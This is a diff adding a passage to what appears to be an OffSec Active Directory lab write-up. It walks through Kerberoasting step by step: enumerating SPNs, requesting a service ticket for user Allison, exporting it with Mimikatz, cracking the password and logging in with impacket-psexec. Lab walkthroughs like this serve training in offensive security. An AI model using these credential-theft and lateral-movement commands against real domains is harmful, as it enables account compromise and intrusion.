@@ -777,3 +777,46 @@ RDP into the 192.168.xxx.59 machine with the credentials and domain OFFSEC to ge
 
 ### Question 3
 
+We will need to run the script first to see what SPNs there are on this network.&#x20;
+
+```
+...
+$Searcher.filter="serviceprincipalname=*"
+...
+<OUTPUT>
+Allison                                                                                                              
+DC01                                                                                                                 
+APPSRV01                                                                                                             
+CLIENT01                                                                                                             
+krbtgt
+```
+
+Recall that from our `net user /domain` command we saw the following users:
+
+```
+-------------------------------------------------------------------------------
+Administrator            Allison                  Guest                     
+krbtgt                   Nathan
+```
+
+It's strange that we have Allison in the SPN listing and user list. This should tip us off that Allison is likely the user we are looking for.
+
+We can then make a ticket.
+
+```
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'Allison'
+```
+
+Then, we'll list the tickets with `klist` and export them in Mimikatz with `kerberos::list /export`.&#x20;
+
+Crack the hash to get the cleartext password of **RockYou!**.
+
+Now, we can use impacket-psexec.
+
+```
+./impacket-psexec offsec.local/Allison:RockYou'!'@192.168.223.59
+```
+
+### Question 4
+
